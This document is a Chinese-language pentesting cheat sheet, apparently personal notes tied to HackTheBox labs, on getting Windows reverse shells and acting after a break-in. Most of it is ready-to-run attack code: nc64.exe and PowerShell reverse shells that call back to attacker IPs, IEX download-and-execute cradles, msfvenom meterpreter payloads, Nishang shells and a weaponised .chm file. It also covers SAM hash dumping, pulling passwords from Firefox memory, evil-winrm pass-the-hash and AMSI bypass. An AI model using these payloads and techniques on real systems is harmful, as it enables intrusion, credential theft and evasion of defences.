 
## Reverse Shell

> **[0x01 Bastard (Drupal EXP,内核提权 , UDF PE)](../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x01%20Bastard%20(Drupal%20EXP,内核提权%20,%20UDF%20PE).md)**

主要目的就是在 kali 中下载一个可供靶机执行的 nc.exe , 通过 Webshell 构造语句让靶机访问本地运行的 samba 服务里的 nc.exe 然后绑定 cmd 链接到 Kali，完成拿 Shell 的整个过程

##### 靶机是 64位就下 nc64.exe
```bash
wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
```

##### 寻找可以让 python 运行的 smbserver 文件
```bash
locate sambashare
/usr/share/doc/python3-impacket/examples/smbserver.py
```

##### 在 Kali 建立本地 smbserver
```bash
└─$ sudo python /usr/share/doc/python3-impacket/examples/smbserver.py share .
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

##### 构造一条语句让靶机访问 Kali 上的 nc64.exe ，绑定靶机上的 cmd.exe ，然后再链接到 Kali 上的监听
- 建立监听
```bash
└─$ nc -lvvp 2233                    
listening on [any] 2233 ...
```

- 构造语句 ( 和  nc -e /bin/bash IP PORT 一样 )
```shell
\\10.10.16.8\share\nc64.exe -e cmd.exe 10.10.16.8 2233
```

然后执行，就拿到了靶机的 Shell

**shell.php**
```php
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '10.10.16.8';  // You have changed this
  $port = 2233;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = '//10.10.16.8/share/nc64.exe -e cmd.exe 10.10.16.8 443';
  $daemon = 0;
  $debug = 0;

[ 下面的就不截取了，都是同样的，用的 Pentestmonkey's reverse shell ]
```

**rev.ps1**
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.159',2233);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" \| Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()|
```
修改代码后建立本地服务器并建立监听 `python -m http.server 80`
调用：
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.159/rev.ps1')"
```


**rev_bypass.ps1**
```powershell
$c = New-Object Net.Sockets.TCPClient('10.10.16.21',443);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close()
```

#### Metasploit
**0x01**
生成一个 reverse_tcp ，然后下载到靶机
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=1337 LHOST=tun0 -f exe > shell.exe
```

设置攻击载荷
```bash
set payload windows/x64/meterpreter/reverse_tcp
```

**0x02**
生成反向 shell，下载到靶机
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=4444 -f exe > rev.exe
```

```bash
rlwrap nc -lvvnp 4444
```


##  NiShang

**nishang** ( /naiʃæŋ/ ) : https://github.com/samratashok/nishang

Nishang 是⼀个基于 PowerShell 的框架和脚本集合，⽤于进⾏攻击性安全测试、渗透测试和红队⾏动。
Nishang 提供了⼀系列基于 PowerShell 的⼯具和载荷，可⽤于侦察、利⽤、横向移动、持久化和数据窃取等不同任务。

以下是 Nishang 提供的⼀些功能和特点： 
1. 远程 Shell 和命令执⾏ 
2. 基于 PowerShell 的反向和绑定 Shell 
3. ⽂件和数据操作 
4. Active Directory 的枚举和利⽤ 
5. 凭据窃取和令牌操作 
6. ⾃动化利⽤和后渗透模块 
7. 提权技术 
8. Web 服务器和客户端功能 
9. 持久化机制和后⻔ 
10. 绕过杀毒软件的技术

```bash
sudo apt install nishang
```

```
└─$ nishang                          

> nishang ~ Collection of PowerShell scripts and payloads

/usr/share/nishang
├── ActiveDirectory
├── Antak-WebShell
├── Backdoors
├── Bypass
├── Client
├── Escalation
├── Execution
├── Gather
├── Misc
├── MITM
├── nishang.psm1
├── Pivot
├── powerpreter
├── Prasadhak
├── Scan
├── Shells
└── Utility
```

`Invoke-PowerShellTcp.ps1` 用到这个脚本
![](photos/Pasted%20image%2020240116202841.png)
复制到当前目录，然后在文件尾部追加:
```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.8 -Port 2233
```
![](photos/Pasted%20image%2020240116203833.png)
在本地架设 http.server 监听8888 ，同时监听2233端口，然后执行命令
```bash
powershell iex(new-object net.webclient).downloadstring('http://10.10.16.8:8888/Invoke-PowerShellTcp.ps1')

iex : Invoke-Expression,执行包含在括号内的字符串作为 PowerShell 表达式
iex(new-object net.webclient).downloadstring('') : 通过创建的 `WebClient` 实例 调用 `DownloadString` 方法，下载指定URL内容并将其作为字符串返回
```
绕过执行策略
```bash
powershell -ep bypass
```

### 武器化.chm

Nishang 有一个工具 `Out-CHM` ，它可以制作武器化的 `.chm` 文件
/usr/share/nishang/Client/Out-CHM.ps1

添加命令在文件尾部
```powershell
Out-CHM -Payload "C:\programdata\nc64.exe -e cmd 10.10.14.29 7788" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

在 Windows Powershell 中运行
安装 htmlhelp : https://www.helpandmanual.com/download/htmlhelp.exe
```powershell
. .\Out-CHM.ps1
```

修改文件名字后传给 kali ，再在靶机上下载到目录中，kali 建立7788监听

**rev.ps1**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.50',2233);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


## 文件下载

[LOLBAS - Certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) 

- certutil.exe
```bash
certutil.exe -urlcache -split -f http://10.10.16.8:8888/JuicyPotato.exe
```

- **Invoke-WevRequest**
```bash
iwr -uri http://x.x.x.x/xxx -OutFIle C:\programdata\xxx
Invoke-WebRequest "http://10.10.16.7:8888/shell.exe" -OutFile "shell.exe"
```

- MpCmdRun.exe


Windows 中的共享目录 ： **programdata**

## 敏感目录

- ##### Windows/System32/ 下的 **SAM** 和 **SYSTEM** ，可以提取用户凭据 hash
使用 **samdump2** 提取 HASH
```bash
└─$ sudo samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
格式为 ： **LMHash : NTLMHash**

- ##### 家目录 + Mozilla Firefox ： Firefox password 敏感信息     > **[0x09 StreamIO (mssql注入,LFI,Firefox凭据泄露)](../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x09%20StreamIO%20(mssql注入,LFI,Firefox凭据泄露).md)** <
- ##### cred.xml 文件 ：powershell 命令获取明文密码
```powershell
powershell -c "$cred = Import-CliXml -Path [File]; $cred.GetNetworkCredential() | Format-List *"
```
- ##### Get-Process 中 Firefox 有进程运行，直接 dump
```powershell
.\procdump64.exe -ma 6424 -accepteula firefox.dmp
strings firefox.dmp |grep -ie "login_username\|login_password"
```

## Evil-WinRM

```
-S 如果指定了-c证书，通常都需要启用安全套接字加密，即给-S选项
-i 指定IP
-k 私钥
-u Username
-p Password
-H 指定hash
```

```bash
evil-winrm -i timelapse.htb -c legacyy_dev_auth.pfx.crt -k legacyy_dev_auth.pfx.decrypted.key -S
evil-winrm -i timelapse.htb -p 'E3R$Q62^12p7PLlC%KWaxuaV' -u svc_deploy -S
evil-winrm -i htb.local -u administrator -H 'c370bddf384a691d811ff3495e8a72e2'
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb  (ccache文件链接)
``` 

```
download 下载文件
upload 上传文件
```


**如果网络上 NTLM 验证被禁用**
**0x01**
- pwsh
/etc/krb5.conf
```
[libdefaults]
        default_realm = SCRM.LOCAL
# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        SCRM.LOCAL = {
                kdc = dc1.scrm.local
                admin_server = dc1.scrm.local
        }

[domain_realm]
```

- GetTGT.py
```bash
sudo pwsh
Install-Module -Name PSWSMan -Scope AllUsers   (安装开放管理基础设施)
exit

pwsh
Enter-PSSession dc1.scrm.local -Credential UserName
登录后再上传nc64.exe 链接到Kali
```

**0x02**
修改/etc/krb5.conf 后
```bash
└─$ python /usr/share/doc/python3-impacket/examples/getTGT.py scrm.local/MiscSvc:ScrambledEggs9900    Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                         [*] Saving ticket in MiscSvc.ccache

└─$ KRB5CCNAME=MiscSvc.ccache evil-winrm -r scrm.local -i dc1.scrm.local
```

##### 获得凭据信息执行 Powerview 脚本 (无远程登录的情况下)
https://github.com/aniqfakhrul/powerview.py
```bash
curl -L powerview.sh | sh
```

```bash
powerview rebound.htb/oorend:'1GR8t@$$4u'@rebound.htb -k
```


**如果 powershell 禁止加载脚本可以尝试绕过**
```
menu
Bypass-4MSI   (evil-winrm 自带的menu中的绕过方式)
```

**爆破 RID 枚举用户名**
```bash
crackmapexec smb rebound.htb -u QWE -p '' --rid-brute > RID_raw
```


## 排错

**STATUS_PASSWORD_MUST_CHANGE ： 需要更改密码**
```bash
smbpasswd -U [Username] -r <IP>
```

